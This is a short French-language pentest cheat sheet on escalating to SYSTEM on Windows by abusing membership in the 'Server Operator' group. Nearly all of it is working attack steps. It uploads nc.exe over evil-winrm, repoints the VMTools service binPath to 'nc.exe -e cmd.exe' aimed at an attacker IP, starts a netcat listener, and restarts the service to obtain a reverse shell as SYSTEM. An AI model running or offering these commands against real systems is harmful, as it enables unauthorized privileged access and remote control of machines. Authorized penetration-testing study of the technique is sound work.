# Server Operator Group Privesc

## Server Operator Group

Si un utilisateur est membre du groupe "Server Operator" il est possible d'escalader vers l’utilisateur SYSTEM.

Une fois connecté avec notre utilisateur via evil-winrm, transférer le fichier nc.exe sur la machine cible:

```bash
upload /usr/share/windows-binaries/nc.exe
```

Puis lister les services lancés:

```powershell
services
```

Il est ensuite possible d'associer notre netcat à l'un de ces services:

```powershell
sc.exe config VMTools binPath="C:\Users\aarti\Documents\nc.exe -e cmd.exe $monIp 1234"
```

Lancer ensuite un netcat en écoute sur l'host:

```
nc -lnvp 1234
```

Puis stopper et relancer le service sur la machine cible:

```
sc.exe stop VMTools
sc.exe start VMTools
```
